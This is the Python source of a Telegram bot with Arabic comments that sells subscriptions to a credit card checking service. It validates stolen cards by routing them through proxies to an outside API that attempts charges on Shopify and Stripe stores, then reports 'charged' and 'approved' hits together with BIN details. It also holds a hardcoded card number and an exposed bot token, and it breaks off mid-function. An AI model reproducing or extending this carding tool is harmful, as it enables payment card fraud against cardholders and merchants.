import telebot
import os
import re
import json
import random
import time
import requests
import string
import secrets
import threading
from datetime import datetime, timedelta
from telebot.types import LabeledPrice, PreCheckoutQuery, InlineKeyboardMarkup, InlineKeyboardButton

# ==================== إعدادات البوت ====================
BOT_TOKEN = '8985561921:AAH26NPSH3Iin7RCpKfi1Q057X1umDjfgds'
ADMIN_IDS = [1093032296,7077116674]
CHECKER_API_URL = 'https://apiehopf-production.up.railway.app'

bot = telebot.TeleBot(BOT_TOKEN, parse_mode="HTML")

# ==================== إعدادات الاشتراك بالنجوم ====================
STAR_PRICES = {
    "1h": {"name": "1 Hour", "stars": 30, "seconds": 3600},
    "12h": {"name": "12 Hours", "stars": 50, "seconds": 43200},
    "24h": {"name": "1 Day", "stars": 100, "seconds": 86400},
    "3d": {"name": "3 Days", "stars": 250, "seconds": 259200},
    "7d": {"name": "1 Week", "stars": 500, "seconds": 604800}
}

# ==================== ثوابت ====================
DEFAULT_CHECK_LIMIT = 5000
ADMIN_MAX_CHECKS = 999999
MAX_USER_PROXIES = 30
SITES_FILE = "sites.txt"
USERS_FILE = "users.json"
CODES_FILE = "codes.json"

# ==================== متغيرات عالمية ====================
active_scans = {}
user_pending_mass = {}
user_pending_sites = {}

# ==================== دوال مساعدة ====================
def is_admin(user_id):
    return user_id in ADMIN_IDS

def load_admin_sites():
    if not os.path.exists(SITES_FILE):
        return []
    try:
        with open(SITES_FILE, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_admin_sites(sites):
    with open(SITES_FILE, 'w', encoding='utf-8') as f:
        for site in sites:
            f.write(f"{site}\n")

def get_user_proxy_file(user_id):
    return f"user_{user_id}_proxy.txt"

def load_user_proxies(user_id):
    file_path = get_user_proxy_file(user_id)
    if not os.path.exists(file_path):
        return []
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            return [line.strip() for line in f if line.strip()]
    except:
        return []

def save_user_proxies(user_id, proxies):
    file_path = get_user_proxy_file(user_id)
    with open(file_path, 'w', encoding='utf-8') as f:
        for proxy in proxies:
            f.write(f"{proxy}\n")

def load_users():
    if not os.path.exists(USERS_FILE):
        return {}
    try:
        with open(USERS_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_users(users):
    with open(USERS_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def load_codes():
    if not os.path.exists(CODES_FILE):
        return {}
    try:
        with open(CODES_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return {}

def save_codes(codes):
    with open(CODES_FILE, 'w', encoding='utf-8') as f:
        json.dump(codes, f, indent=2, ensure_ascii=False)

def get_user_subscription(user_id):
    users = load_users()
    user_data = users.get(str(user_id), {})
    expiry = user_data.get('subscription_expiry', 0)
    if expiry > time.time():
        return True, expiry
    return False, 0

def activate_subscription(user_id, plan_key):
    plan = STAR_PRICES.get(plan_key)
    if not plan:
        return False, "Invalid plan"
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    now = time.time()
    current_expiry = users[user_id_str].get('subscription_expiry', 0)
    if current_expiry > now:
        new_expiry = current_expiry + plan['seconds']
    else:
        new_expiry = now + plan['seconds']
    users[user_id_str]['subscription_expiry'] = new_expiry
    users[user_id_str]['premium'] = True
    users[user_id_str]['check_limit'] = DEFAULT_CHECK_LIMIT
    save_users(users)
    return True, new_expiry

def get_user_checks_left(user_id):
    if is_admin(user_id):
        return ADMIN_MAX_CHECKS
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    limit = user_data.get('check_limit', DEFAULT_CHECK_LIMIT)
    return max(0, limit - total_checks)

def increment_user_checks(user_id, count=1):
    if is_admin(user_id):
        return
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0) + count
    save_users(users)

def generate_activation_code():
    return secrets.token_hex(8).upper()

def create_activation_code(checks_limit=DEFAULT_CHECK_LIMIT):
    codes = load_codes()
    code = generate_activation_code()
    codes[code] = {
        'checks_limit': checks_limit,
        'used': False,
        'used_by': None,
        'created_at': datetime.now().isoformat()
    }
    save_codes(codes)
    return code

def activate_code(user_id, code):
    if is_admin(user_id):
        return True, "أنت أدمن، لا تحتاج تفعيل!"
    codes = load_codes()
    if code not in codes:
        return False, "الكود غير صالح!"
    code_data = codes[code]
    if code_data.get('used', False):
        return False, "الكود مستخدم من قبل!"
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['premium'] = True
    users[user_id_str]['check_limit'] = code_data['checks_limit']
    users[user_id_str]['total_checks'] = users[user_id_str].get('total_checks', 0)
    users[user_id_str]['activated_at'] = datetime.now().isoformat()
    code_data['used'] = True
    code_data['used_by'] = user_id_str
    code_data['used_at'] = datetime.now().isoformat()
    save_users(users)
    save_codes(codes)
    return True, f"تم التفعيل بنجاح! لديك {code_data['checks_limit']} عملية فحص متاحة."

def is_user_blocked(user_id):
    if is_admin(user_id):
        return False
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('blocked', False)

def block_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {}
    users[user_id_str]['blocked'] = True
    save_users(users)

def unblock_user(user_id):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str in users:
        users[user_id_str]['blocked'] = False
        save_users(users)

def get_all_users():
    users = load_users()
    return users

def is_premium_user(user_id):
    if is_admin(user_id):
        return True
    users = load_users()
    user_data = users.get(str(user_id), {})
    return user_data.get('premium', False)

def is_user_subscribed(user_id):
    if is_admin(user_id):
        return True
    is_active, _ = get_user_subscription(user_id)
    if is_active:
        return True
    return is_premium_user(user_id) and get_user_checks_left(user_id) > 0

def create_user_if_not_exists(user_id, username):
    users = load_users()
    user_id_str = str(user_id)
    if user_id_str not in users:
        users[user_id_str] = {
            'user_id': user_id,
            'username': username,
            'registered_at': datetime.now().isoformat(),
            'total_checks': 0,
            'successful_checks': 0,
            'premium': False,
            'check_limit': 0,
            'blocked': False,
            'subscription_expiry': 0
        }
        save_users(users)
        for admin_id in ADMIN_IDS:
            try:
                bot.send_message(admin_id, f"🆕 <b>New user joined!</b>\n\n🆔 ID: <code>{user_id}</code>\n👤 Username: @{username}\n📅 Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", parse_mode='HTML')
            except:
                pass

# ==================== دوال الواجهة ====================
def get_main_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    btn_cmd = InlineKeyboardButton("📋 Commands", callback_data="show_commands")
    btn_sub = InlineKeyboardButton("⭐ Subscribe", callback_data="show_subscription")
    keyboard.add(btn_cmd, btn_sub)
    return keyboard

def get_commands_keyboard():
    keyboard = InlineKeyboardMarkup()
    btn_back = InlineKeyboardButton("🔙 Back", callback_data="main_menu")
    keyboard.add(btn_back)
    return keyboard

def get_admin_menu_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    btn_stats = InlineKeyboardButton("📊 Stats", callback_data="admin_stats")
    btn_broadcast = InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast")
    btn_block = InlineKeyboardButton("🔨 Block", callback_data="admin_block")
    btn_unblock = InlineKeyboardButton("🔓 Unblock", callback_data="admin_unblock")
    btn_set_limit = InlineKeyboardButton("📈 Set Limit", callback_data="admin_set_limit")
    btn_sites = InlineKeyboardButton("🌐 Site Management", callback_data="admin_sites")
    btn_back = InlineKeyboardButton("🔙 Back", callback_data="main_menu")
    keyboard.add(btn_stats, btn_broadcast)
    keyboard.add(btn_block, btn_unblock)
    keyboard.add(btn_set_limit, btn_sites)
    keyboard.add(btn_back)
    return keyboard

def get_admin_sites_menu():
    keyboard = InlineKeyboardMarkup(row_width=1)
    btn_view = InlineKeyboardButton("📋 View Sites", callback_data="admin_view_sites")
    btn_add = InlineKeyboardButton("➕ Add Site", callback_data="admin_add_site")
    btn_remove = InlineKeyboardButton("🗑️ Remove Site", callback_data="admin_remove_site")
    btn_check = InlineKeyboardButton("🔄 Check Sites", callback_data="admin_check_sites")
    btn_upload = InlineKeyboardButton("📁 Upload Sites File", callback_data="admin_upload_sites")
    btn_clear = InlineKeyboardButton("💣 Clear All Sites", callback_data="admin_clear_sites")
    btn_back = InlineKeyboardButton("🔙 Back", callback_data="admin_panel")
    keyboard.add(btn_view, btn_add, btn_remove, btn_check, btn_upload, btn_clear, btn_back)
    return keyboard

def get_subscription_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=2)
    for key, plan in STAR_PRICES.items():
        name = plan['name']
        stars = plan['stars']
        btn = InlineKeyboardButton(f"⭐ {name} - {stars}⭐", callback_data=f"sub_{key}")
        keyboard.add(btn)
    btn_back = InlineKeyboardButton("🔙 Back", callback_data="main_menu")
    keyboard.add(btn_back)
    return keyboard

def get_price_filter_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    btn_1 = InlineKeyboardButton("🔰 1$ - 10$", callback_data="price_1")
    btn_2 = InlineKeyboardButton("💰 5$ - 20$", callback_data="price_2")
    btn_3 = InlineKeyboardButton("💎 10$ - 30$", callback_data="price_3")
    btn_4 = InlineKeyboardButton("⭐ No filter", callback_data="price_4")
    btn_back = InlineKeyboardButton("🔙 Cancel", callback_data="admin_cancel")
    keyboard.add(btn_1, btn_2, btn_3, btn_4, btn_back)
    return keyboard

def get_mode_keyboard():
    keyboard = InlineKeyboardMarkup(row_width=1)
    btn_charges = InlineKeyboardButton("💎 CHARGES ONLY", callback_data="mode_charges")
    btn_all = InlineKeyboardButton("💎 + ✅ ALL HITS", callback_data="mode_all")
    btn_cancel = InlineKeyboardButton("❌ Cancel", callback_data="mode_cancel")
    keyboard.add(btn_charges, btn_all, btn_cancel)
    return keyboard

# ==================== دوال فحص البروكسيات ====================
def parse_proxy_url(proxy_str):
    if not proxy_str:
        return None
    proxy_str = proxy_str.strip()
    if '@' in proxy_str and ':' in proxy_str.split('@')[0]:
        return f"http://{proxy_str}"
    parts = proxy_str.split(':')
    if len(parts) == 4:
        host, port, user, password = parts
        return f"http://{user}:{password}@{host}:{port}"
    if len(parts) == 2:
        host, port = parts
        return f"http://{host}:{port}"
    if proxy_str.startswith('http://') or proxy_str.startswith('https://'):
        return proxy_str
    return None

def test_proxy_direct(proxy_str):
    proxy_url = parse_proxy_url(proxy_str)
    if not proxy_url:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Invalid proxy format'}
    test_url = "https://musicstore.myshopify.com"
    try:
        response = requests.get(test_url, proxies={'http': proxy_url, 'https': proxy_url}, timeout=15)
        if response.status_code == 200:
            return {'proxy': proxy_str, 'status': 'alive', 'reason': f'HTTP {response.status_code}'}
        else:
            return {'proxy': proxy_str, 'status': 'dead', 'reason': f'HTTP {response.status_code}'}
    except requests.Timeout:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Timeout (15s)'}
    except requests.ConnectionError:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': 'Connection refused'}
    except Exception as e:
        return {'proxy': proxy_str, 'status': 'dead', 'reason': f'Error: {str(e)[:40]}'}

# ==================== دوال فحص الكروت ====================
def check_card_sync(card, site, proxy):
    try:
        parts = card.split('|')
        if len(parts) != 4:
            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'site': site}
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={card}'
        if proxy:
            url += f'&proxy={proxy}'
        response = requests.get(url, timeout=120)
        if response.status_code != 200:
            return {'status': 'Dead', 'message': f'HTTP Error: {response.status_code}', 'card': card, 'site': site}
        raw = response.json()
        response_msg = raw.get('Response', '')
        price = raw.get('Price', 0.0)
        gateway = raw.get('Gateway', 'Shopify')
        try:
            price_val = float(price)
            price = f"${price_val:.2f}"
        except:
            price = "-"
        charged_keywords = ['ORDER_PLACED', 'PROCESSEDRECEIPT', 'ORDER_CONFIRMED', 'SUCCESS', 'CHARGED']
        approved_keywords = ['INSUFFICIENT_FUNDS', 'INSUFFICIENT FUNDS', 'OTP_REQUIRED', '3D_SECURE', 'ACTION_REQUIRED', '3D']
        response_upper = response_msg.upper()
        if any(kw in response_upper for kw in charged_keywords):
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        elif any(kw in response_upper for kw in approved_keywords):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gateway, 'price': price}
        else:
            return {'status': 'Dead', 'message': response_msg if response_msg else 'Card Declined', 'card': card, 'site': site, 'gateway': gateway, 'price': price}
    except requests.Timeout:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'site': site, 'retry': True}
    except Exception as e:
        return {'status': 'Dead', 'message': str(e), 'card': card, 'site': site, 'gateway': 'Unknown', 'price': '-'}

def check_card_with_retry(card, sites, proxies, max_retries=2):
    last_result = None
    if not sites:
        return {'status': 'Dead', 'message': 'No sites available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
    if not proxies:
        return {'status': 'Dead', 'message': 'No proxies available', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}
    for attempt in range(max_retries):
        site = random.choice(sites)
        proxy = random.choice(proxies)
        result = check_card_sync(card, site, proxy)
        if not result.get('retry'):
            return result
        last_result = result
        if attempt < max_retries - 1:
            time.sleep(0.5)
    if last_result:
        return {'status': 'Dead', 'message': f'Site errors: {last_result["message"]}', 'card': card, 'gateway': last_result.get('gateway', 'Unknown'), 'price': last_result.get('price', '-'), 'site': 'Multiple'}
    return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Unknown', 'price': '-', 'site': 'None'}

# ==================== دوال واجهة المستخدم ====================
def get_user_stats_text(user_id, username):
    users = load_users()
    user_data = users.get(str(user_id), {})
    total_checks = user_data.get('total_checks', 0)
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    is_blocked = user_data.get('blocked', False)
    proxies_count = len(load_user_proxies(user_id))
    is_active, expiry = get_user_subscription(user_id)
    if is_blocked:
        status = "🚫 Blocked"
    elif is_admin(user_id):
        status = "👑 ADMIN | Unlimited"
    elif is_active:
        remaining = int(expiry - time.time())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        status = f"⭐ PREMIUM | {hours}h {minutes}m left"
    elif is_premium_user:
        status = f"⭐ PREMIUM | {checks_left} checks left"
    else:
        status = "🆓 FREE | Subscribe /subscribe"
    sites = load_admin_sites()
    sites_count = len(sites)
    sites_preview = "\n".join([f"    ┣ 🌐 {site}" for site in sites[:5]])
    if sites_count > 5:
        sites_preview += f"\n    ┗ ... and {sites_count - 5} more"
    elif sites_count == 0:
        sites_preview = "    ┣ 🌐 No sites available"
    text = f"👋 Welcome , @{username}!\n\n"
    text += f" Account 🚀 \n\n"
    text += f"    ┣ 📝 Plan: {status}\n"
    text += f"    ┣ 🔌 Proxies: {proxies_count}\n"
    text += f"    ┣ 💥 Hits: {user_data.get('successful_checks', 0)}\n"
    text += f"    ┗ 📈 Total: {total_checks}\n\n"
    text += f" 🌐 Available Sites ({sites_count}):\n"
    text += f"{sites_preview}\n\n"
    text += f"💡 Made by: @ISoonik"
    return text

# ==================== دوال فحص المواقع ====================
ALLOWED_GATEWAYS = ['shopify payments', 'shopify', 'shopify_payments', 'stripe']

def test_site(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        response = requests.get(url, timeout=30)
        if response.status_code != 200:
            return {'site': site, 'status': 'dead'}
        raw = response.json()
        if raw.get('Status', False):
            return {'site': site, 'status': 'alive'}
        else:
            return {'site': site, 'status': 'dead'}
    except:
        return {'site': site, 'status': 'dead'}

def get_site_gateway(site, proxy):
    test_card = "4031630422575208|01|2030|280"
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'{CHECKER_API_URL}/shopify?site={site}&cc={test_card}'
        if proxy:
            url += f'&proxy={proxy}'
        response = requests.get(url, timeout=30)
        if response.status_code != 200:
            return None
        raw = response.json()
        gateway = raw.get('Gateway', '').lower()
        return gateway
    except:
        return None

def get_site_min_price(site):
    try:
        if site.startswith('https://') or site.startswith('http://'):
            site = site.replace('https://', '').replace('http://', '').rstrip('/')
        url = f'https://{site}/products.json?limit=50'
        response = requests.get(url, timeout=30)
        if response.status_code != 200:
            return None
        data = response.json()
        products = data.get('products', [])
        min_price = None
        for product in products:
            variants = product.get('variants', [])
            for variant in variants:
                if variant.get('available', True):
                    try:
                        price = float(variant.get('price', 0))
                        if min_price is None or price < min_price:
                            min_price = price
                    except:
                        pass
        return min_price
    except:
        return None

def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        response = requests.get(f'https://bins.antipublic.cc/bins/{bin_number}', timeout=10)
        if response.status_code != 200:
            return '-', '-', '-', '-', '-', ''
        data = response.json()
        brand = data.get('brand', '-')
        bin_type = data.get('type', '-')
        level = data.get('level', '-')
        bank = data.get('bank', '-')
        country = data.get('country_name', '-')
        flag = data.get('country_flag', '')
        return brand, bin_type, level, bank, country, flag
    except:
        return '-', '-', '-', '-', '-', ''

def extract_cc(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    matches = re.findall(pattern, text)
    cards = []
    for match in matches:
        card, month, year, cvv = match
        if len(year) == 2:
            year = '20' + year
        cards.append(f"{card}|{month}|{year}|{cvv}")
    return cards

def send_hit_message(user_id, result, hit_type):
    if hit_type == 'Charged':
        emoji = "💎"
        status_text = "𝐂𝐇𝐀𝐑𝐆𝐄𝐃"
    else:
        emoji = "✅"
        status_text = "𝐀𝐏𝐏𝐑𝐎𝐕𝐄𝐃"
    brand, bin_type, level, bank, country, flag = get_bin_info(result['card'].split('|')[0])
    message = f"""<b>━━━━━━━━━━━━━━━━━</b>
<b>⚡ 𝐇𝐢𝐭</b>
<blockquote>{emoji} Status: {status_text}</blockquote>
<blockquote>💳 Card: <code>{result['card']}</code></blockquote>
<blockquote>📝 Response: {result['message'][:150]}</blockquote>
<blockquote>🌐 Gateway: 🔥 {result.get('gateway', 'Unknown')} | 💰 {result.get('price', '-')}</blockquote>
<b>💠 BIN Info</b>
<pre>BIN Info: {brand} - {bin_type} - {level}
Bank: {bank}
Country: {country} {flag}</pre>
"""
    try:
        bot.send_message(user_id, message, parse_mode='HTML')
    except:
        pass

# ==================== معالجة الدفع بالنجوم ====================
@bot.pre_checkout_query_handler(func=lambda query: True)
def handle_pre_checkout_query(pre_checkout_query: PreCheckoutQuery):
    bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)

@bot.message_handler(content_types=['successful_payment'])
def handle_successful_payment(message):
    user_id = message.from_user.id
    payload = message.successful_payment.invoice_payload
    parts = payload.split('_')
    if len(parts) >= 2 and parts[0] == 'sub':
        plan_key = parts[1]
        success, expiry = activate_subscription(user_id, plan_key)
        if success:
            bot.send_message(user_id, f"✅ <b>Subscription Activated!</b>\n\nYour {STAR_PRICES[plan_key]['name']} subscription has been activated.\n\nExpires: {datetime.fromtimestamp(expiry).strftime('%Y-%m-%d %H:%M:%S')}", parse_mode='HTML')
        else:
            bot.send_message(user_id, "❌ Error activating subscription. Please contact admin.")
    for admin_id in ADMIN_IDS:
        bot.send_message(admin_id, f"💎 <b>New Star Payment!</b>\n\n👤 User: {message.from_user.first_name}\n🆔 ID: <code>{user_id}</code>\n💰 Amount: {message.successful_payment.total_amount} stars", parse_mode='HTML')

# ==================== أوامر البوت الأساسية ====================
@bot.message_handler(commands=['start'])
def start_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    username = message.from_user.username or f"user_{user_id}"
    create_user_if_not_exists(user_id, username)
    stats_text = get_user_stats_text(user_id, username)
    bot.reply_to(message, stats_text, reply_markup=get_main_menu_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['help'])
def help_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    help_text = """<b>📋 User Commands:</b>

├ <code>/start</code> - Show main menu
├ <code>/help</code> - Show this help
├ <code>/profile</code> - View your profile
├ <code>/myproxy</code> - View your proxies

<b>🔌 Proxy Management:</b>
├ <code>/proxy</code> - Check all proxies & remove dead
├ <code>/addproxy</code> - Add proxies (one per line)
├ <code>/addproxies</code> - Upload .txt file with proxies
├ <code>/chkproxy proxy</code> - Check single proxy
├ <code>/rmproxy proxy</code> - Remove single proxy
├ <code>/clearproxy</code> - Remove all proxies
└ <code>/getproxy</code> - Get all proxies

<b>💳 Card Checking:</b>
├ <code>/cc cc|mm|yy|cvv</code> - Check single card
├ <code>/chk</code> - Mass check (reply to .txt file)
└ <code>/mcancel</code> - Cancel mass check

<b>⭐ Subscription:</b>
├ <code>/subscribe</code> - Buy subscription with stars
└ <code>/redeem CODE</code> - Redeem activation code

<b>📝 Formats:</b>
├ CC: <code>card|mm|yyyy|cvv</code>
└ Proxy: <code>ip:port</code> or <code>ip:port:user:pass</code>"""
    if is_admin(user_id):
        help_text += """

<b>👑 Admin Commands:</b>
├ <code>/admin</code> - Admin panel
├ <code>/site domain</code> - Add site
├ <code>/rmsite url</code> - Remove site
├ <code>/sitecheck</code> - Check all sites
├ <code>/addsites</code> - Upload sites file
├ <code>/clearsites</code> - Clear all sites
├ <code>/mysites</code> - View all sites
├ <code>/gencode number</code> - Generate activation code
├ <code>/block user_id</code> - Block user
├ <code>/unblock user_id</code> - Unblock user
├ <code>/broadcast message</code> - Broadcast to all users
├ <code>/setlimit user_id number</code> - Set user check limit
├ <code>/users</code> - List all users
├ <code>/user user_id</code> - Show user details
└ <code>/stats</code> - Bot statistics"""
    bot.reply_to(message, help_text, reply_markup=get_commands_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['profile'])
def profile_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    users = load_users()
    user_data = users.get(str(user_id), {})
    username = message.from_user.username or f"user_{user_id}"
    first_name = message.from_user.first_name or "User"
    total_checks = user_data.get('total_checks', 0)
    successful_checks = user_data.get('successful_checks', 0)
    registered_at = user_data.get('registered_at', datetime.now().isoformat())[:10]
    checks_left = get_user_checks_left(user_id)
    is_premium_user = user_data.get('premium', False) or is_admin(user_id)
    check_limit = user_data.get('check_limit', 0) if not is_admin(user_id) else "UNLIMITED"
    proxies_count = len(load_user_proxies(user_id))
    is_active, expiry = get_user_subscription(user_id)
    if is_active:
        remaining = int(expiry - time.time())
        hours = remaining // 3600
        minutes = (remaining % 3600) // 60
        subscription_status = f"✅ Active ({hours}h {minutes}m left)"
    else:
        subscription_status = "❌ No active subscription"
    text = f"""<b>👤 Profile</b>

├ 🆔 User ID: <code>{user_id}</code>
├ 👤 Name: {first_name}
├ 📝 Username: @{username}
├ 📊 Total Checks: {total_checks}
├ 💎 Successful Hits: {successful_checks}
├ 🔌 Proxies Added: {proxies_count}
├ ⭐ Status: {'👑 ADMIN' if is_admin(user_id) else '✅ PREMIUM' if is_premium_user else '❌ FREE'}
├ 📈 Check Limit: {check_limit}
├ 💳 Checks Left: {checks_left if not is_admin(user_id) else '♾️'}
├ 📅 Registered: {registered_at}
└ ⭐ Subscription: {subscription_status}"""
    bot.reply_to(message, text, reply_markup=get_commands_keyboard(), parse_mode='HTML')

@bot.message_handler(commands=['myproxy'])
def myproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    proxies = load_user_proxies(user_id)
    if not proxies:
        bot.reply_to(message, "❌ No proxies found. Use /addproxy to add.")
        return
    if len(proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(proxies)])
        bot.reply_to(message, f"<b>📋 Your proxies ({len(proxies)}):</b>\n\n{proxy_list}", parse_mode='HTML')
    else:
        filename = f"proxies_{user_id}_{int(time.time())}.txt"
        with open(filename, 'w') as f:
            for i, proxy in enumerate(proxies):
                f.write(f"{i+1}. {proxy}\n")
        with open(filename, 'rb') as f:
            bot.send_document(user_id, f, caption=f"<b>📋 Your proxies ({len(proxies)}):</b>", parse_mode='HTML')
        os.remove(filename)

# ==================== أوامر إضافة البروكسيات ====================
@bot.message_handler(commands=['addproxy'])
def addproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    msg = bot.reply_to(message, "📝 <b>Send proxies one per line.</b>\n\nExample:\n<code>proxy1:port:user:pass\nproxy2:port:user:pass</code>\n\nSend /cancel to cancel.", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_addproxy, user_id)

def process_addproxy(message, user_id):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Operation cancelled.")
        return
    proxies_to_add = [line.strip() for line in message.text.split('\n') if line.strip()]
    if not proxies_to_add:
        bot.reply_to(message, "❌ No proxies provided.")
        return
    current_proxies = load_user_proxies(user_id)
    if len(current_proxies) + len(proxies_to_add) > MAX_USER_PROXIES:
        remaining = MAX_USER_PROXIES - len(current_proxies)
        bot.reply_to(message, f"⚠️ <b>Proxy limit reached!</b>\n\nYou can only have {MAX_USER_PROXIES} proxies maximum.\nYou have {len(current_proxies)} proxies.\nYou can add {remaining} more proxies.", parse_mode='HTML')
        return
    new_proxies = [p for p in proxies_to_add if p not in current_proxies]
    if not new_proxies:
        bot.reply_to(message, "⚠️ All proxies already exist.")
        return
    with open(get_user_proxy_file(user_id), 'a') as f:
        for proxy in new_proxies:
            f.write(f"{proxy}\n")
    bot.reply_to(message, f"✅ <b>Proxies Added!</b>\n\nAdded {len(new_proxies)} new proxies.\nTotal proxies: {len(current_proxies) + len(new_proxies)}/{MAX_USER_PROXIES}", parse_mode='HTML')

@bot.message_handler(commands=['addproxies'])
def addproxies_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    msg = bot.reply_to(message, "📁 <b>Send me a .txt file containing proxies (one per line).</b>\n\nExample format:\n<code>proxy1:port:user:pass\nproxy2:port:user:pass</code>\n\nSend /cancel to cancel.", parse_mode='HTML')
    bot.register_next_step_handler(msg, process_proxy_file, user_id)

def process_proxy_file(message, user_id):
    if message.text and message.text.lower() == '/cancel':
        bot.reply_to(message, "❌ Operation cancelled.")
        return
    if not message.document:
        bot.reply_to(message, "❌ Please send a .txt file.")
        return
    if not message.document.file_name.endswith('.txt'):
        bot.reply_to(message, "❌ Please send a .txt file.")
        return
    try:
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        content = downloaded_file.decode('utf-8')
        proxies = [line.strip() for line in content.split('\n') if line.strip()]
        if not proxies:
            bot.reply_to(message, "❌ No valid proxies found in file.")
            return
        current_proxies = load_user_proxies(user_id)
        new_proxies = [p for p in proxies if p not in current_proxies]
        if not new_proxies:
            bot.reply_to(message, "⚠️ All proxies already exist.")
            return
        with open(get_user_proxy_file(user_id), 'a') as f:
            for proxy in new_proxies:
                f.write(f"{proxy}\n")
        bot.reply_to(message, f"✅ <b>Proxies Added!</b>\n\nAdded {len(new_proxies)} new proxies.\nTotal proxies: {len(current_proxies) + len(new_proxies)}", parse_mode='HTML')
    except Exception as e:
        bot.reply_to(message, f"❌ Error processing file: {e}")

@bot.message_handler(commands=['chkproxy'])
def chkproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    try:
        proxy = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ Usage: /chkproxy ip:port:user:pass")
        return
    msg = bot.reply_to(message, f"🔄 Checking proxy: <code>{proxy}</code>...", parse_mode='HTML')
    try:
        result = test_proxy_direct(proxy)
        if result['status'] == 'alive':
            bot.edit_message_text(f"✅ <b>Proxy is ALIVE!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
        else:
            bot.edit_message_text(f"❌ <b>Proxy is DEAD!</b>\n\n<code>{proxy}</code>\nReason: {result['reason']}", chat_id=message.chat.id, message_id=msg.message_id, parse_mode='HTML')
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {e}", chat_id=message.chat.id, message_id=msg.message_id)

@bot.message_handler(commands=['rmproxy'])
def rmproxy_command(message):
    user_id = message.from_user.id
    if is_user_blocked(user_id) and not is_admin(user_id):
        bot.reply_to(message, "🚫 <b>You have been banned from this bot.</b>", parse_mode='HTML')
        return
    try:
        proxy_to_remove = message.text.split(' ', 1)[1].strip()
    except:
        bot.reply_to(message, "❌ Usage: /rmproxy ip:port:user:pass")
        return
    current_proxies = load_user_proxies(user_id)
    if proxy_to_remove not in current_proxies:
